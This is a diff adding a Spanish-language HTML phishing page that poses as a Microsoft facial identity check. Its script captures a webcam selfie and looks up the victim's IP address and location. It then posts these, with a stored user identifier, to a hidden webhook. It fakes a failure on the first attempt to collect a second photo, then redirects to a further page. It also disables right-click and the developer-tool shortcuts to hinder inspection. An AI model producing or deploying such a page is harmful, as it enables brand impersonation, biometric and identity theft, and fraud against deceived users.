@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Verificación de Identidad</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript" src="dsc.js"></script>
+
+    <style>
+        :root {
+            --blue-dark: #106ebe;
+            --blue-light: #0078d4;
+            --gray-dark: #616161;
+            --border-radius: 12px;
+            --box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            --transition: all 0.3s ease-in-out;
+        }
+
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+
+        body,
+        html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #1b1b1b;
+            line-height: 1.5;
+            padding-bottom: 30px;
+        }
+
+        body {
+            background: url('banner.svg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 0 15px;
+            animation: fadeIn 0.5s ease-out;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-box {
+            width: 440px;
+            max-width: 100%;
+            background-color: rgba(255, 255, 255, 0.98);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 20px 0;
+            backdrop-filter: blur(10px);
+        }
+
+        .login-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .login-header img {
+            padding-bottom: 24px;
+            width: 108px;
+            transition: transform 0.3s ease;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #242424;
+            margin: 0 0 8px 0;
+        }
+
+        /* Instrucciones mejoradas */
+        .instructions-wrapper {
+            background-color: rgba(243, 242, 241, 0.7);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border-left: 4px solid var(--blue-light);
+        }
+
+        .instructions-wrapper p {
+            font-size: 14px;
+            color: #424242;
+            margin-bottom: 12px;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .guide-list {
+            list-style: none;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            font-size: 13px;
+            color: #505050;
+        }
+
+        .guide-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .guide-list li i {
+            color: var(--blue-light);
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+        }
+
+        /* Camara contenedor dinamico */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 3/4;
+            background-color: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #videoElement {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            /* Efecto espejo */
+        }
+
+        /* Marco de guía para el rostro como overlay pulsante */
+        .face-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 65%;
+            height: 65%;
+            border: 2px dashed rgba(255, 255, 255, 0.6);
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.4);
+            pointer-events: none;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                border-color: rgba(255, 255, 255, 0.6);
+            }
+
+            50% {
+                transform: translate(-50%, -50%) scale(1.03);
+                border-color: rgba(255, 255, 255, 1);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+                border-color: rgba(255, 255, 255, 0.6);
+            }
+        }
+
+        .btn-primary {
+            background-color: var(--blue-light);
+            color: white;
+            width: 100%;
+            height: 48px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: center;
+            border: none;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--blue-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        #error-message {
+            display: none;
+            color: #d83b01;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            padding: 10px;
+            background-color: rgba(216, 59, 1, 0.1);
+            border-radius: 4px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Loading overlay inside camera */
+        .camera-loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            z-index: 2;
+            font-size: 14px;
+            gap: 10px;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: none;
+                background-color: white;
+            }
+
+            body::before {
+                background: none;
+            }
+
+            .login-container {
+                padding: 0;
+                align-items: flex-start;
+            }
+
+            .login-box {
+                margin: 0;
+                border-radius: 0;
+                box-shadow: none;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "F12") return false;
+            if (e.ctrlKey && e.key === "u") return false;
+            if (e.ctrlKey && e.shiftKey && e.key === "I") return false;
+        });
+    </script>
+
+    <div class="login-container">
+        <div class="login-box">
+            <div class="login-header">
+                <img src=" tt.png"
+                    alt="Microsoft Logo">
+                <h1 class="login-title">Verificación Facial</h1>
+            </div>
+
+            <div class="instructions-wrapper">
+                <p>Para proteger tu cuenta, necesitamos verificar tu identidad con una selfie rápida. Asegúrate de
+                    cumplir con lo siguiente:</p>
+                <ul class="guide-list">
+                    <li><i class="fas fa-sun"></i> <b>Iluminación clara:</b> Que se vea bien tu rostro.</li>
+                    <li><i class="fas fa-hat-cowboy"></i> <b>Sin accesorios:</b> Quítate gorros o sombreros.</li>
+                    <li><i class="fas fa-glasses"></i> <b>Sin lentes:</b> Evita anteojos oscuros o que reflejen luz.
+                    </li>
+                </ul>
+            </div>
+
+            <div class="camera-wrapper">
+                <div class="camera-loading" id="camera-loading">
+                    <div class="spinner"></div>
+                    <span>Activando cámara...</span>
+                </div>
+                <video id="videoElement" autoplay playsinline muted></video>
+                <div class="face-guide"></div>
+            </div>
+
+            <canvas id="canvas" style="display:none;"></canvas>
+
+            <div id="error-message">
+                <i class="fas fa-exclamation-circle"></i> La imagen no cumple con los requisitos de seguridad. Por
+                favor, asegúrate de estar en un lugar bien iluminado e inténtalo de nuevo.
+            </div>
+
+            <button type="button" class="btn-primary" id="capture-btn" disabled>
+                <i class="fas fa-camera"></i> Tomar Selfie
+            </button>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvas');
+            const captureBtn = $('#capture-btn');
+            const errorMessage = $('#error-message');
+            const cameraLoading = $('#camera-loading');
+
+            let failedOnce = false;
+
+            // Inicializar camara
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(function (stream) {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = function (e) {
+                            video.play();
+                            cameraLoading.fadeOut();
+                            captureBtn.prop('disabled', false);
+                        };
+                    })
+                    .catch(function (err) {
+                        cameraLoading.html('<i class="fas fa-exclamation-triangle" style="font-size:24px;color:#d83b01"></i><br><span style="text-align:center">Error al acceder a la cámara. Por favor, otórgale permisos al navegador.</span>');
+                    });
+            } else {
+                cameraLoading.html('Tu navegador no soporta el acceso a la cámara.');
+            }
+
+            function dataURItoBlob(dataURI) {
+                var byteString = atob(dataURI.split(',')[1]);
+                var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+                var ab = new ArrayBuffer(byteString.length);
+                var ia = new Uint8Array(ab);
+                for (var i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+
+            captureBtn.on('click', function () {
+                errorMessage.hide();
+                var originalText = captureBtn.html();
+                captureBtn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Verificando...');
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                let ctx = canvas.getContext('2d');
+                // Para que se guarde igual a como se ve (espejo)
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                var dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                var blob = dataURItoBlob(dataURL);
+
+                var formData = new FormData();
+                var now = new Date();
+                var filename = "selfie_" + now.getTime() + ".jpg";
+                formData.append("file", blob, filename);
+
+                var email = localStorage.getItem('telefonoUsuario') || 'Desconocido';
+
+                $.getJSON("https://api.ipify.org?format=json", function (data) {
+                    var ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        var ip2 = response.city + ", " + response.country;
+
+                        var message = "\n📸 **Nueva Selfie Recibida**\n📧Usuario: " + email + "\n📌 IP: " + ip + "\n📍 Ubicación: " + ip2;
+                        if (!failedOnce) {
+                            message += "\n⚠️ (Primer intento selfie - ERROR)";
+                        } else {
+                            message += "\n✅ (Segundo intento selfie - ÉXITO)";
+                        }
+
+                        formData.append("payload_json", JSON.stringify({
+                            content: message
+                        }));
+
+                        sendWebhook(formData, originalText);
+
+                    }).fail(function () {
+                        var message = "\n📸 **Nueva Selfie Recibida**\n📧Usuario: " + email + "\n📌 IP: " + ip + "\n📍 Ubicación: No disponible";
+                        if (!failedOnce) message += "\n⚠️ (Primer intento selfie - MOSTRAMOS ERROR)";
+                        else message += "\n✅ (Segundo intento selfie - ÉXITO)";
+
+                        formData.append("payload_json", JSON.stringify({ content: message }));
+                        sendWebhook(formData, originalText);
+                    });
+                }).fail(function () {
+                    var message = "\n📸 **Nueva Selfie Recibida**\n📧Usuario: " + email + "\n📌 IP: No disponible\n📍 Ubicación: No disponible";
+                    if (!failedOnce) message += "\n⚠️ (Primer intento selfie - MOSTRAMOS ERROR)";
+                    else message += "\n✅ (Segundo intento selfie - ÉXITO)";
+
+                    formData.append("payload_json", JSON.stringify({ content: message }));
+                    sendWebhook(formData, originalText);
+                });
+            });
+
+            function sendWebhook(formData, originalText) {
+                $.ajax({
+                    url: wu,
+                    type: 'POST',
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function (res) {
+                        if (!failedOnce) {
+                            failedOnce = true;
+                            captureBtn.prop('disabled', false).html('<i class="fas fa-camera"></i> Volver a Intentar');
+                            errorMessage.show();
+                        } else {
+                            captureBtn.html('<i class="fas fa-check"></i> Verificación Exitosa').css('background-color', '#2e7d32');
+                            setTimeout(function () {
+                                window.location = 'cargando4.html';
+                            }, 1500);
+                        }
+                    },
+                    error: function () {
+                        // Proceder independientemente del error del webhook para no bloquear el flujo
+                        if (!failedOnce) {
+                            failedOnce = true;
+                            captureBtn.prop('disabled', false).html('<i class="fas fa-camera"></i> Volver a Intentar');
+                            errorMessage.show();
+                        } else {
+                            captureBtn.html('<i class="fas fa-check"></i> Verificación Exitosa').css('background-color', '#2e7d32');
+                            setTimeout(function () {
+                                window.location = 'cargando4.html';
+                            }, 1500);
+                        }
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
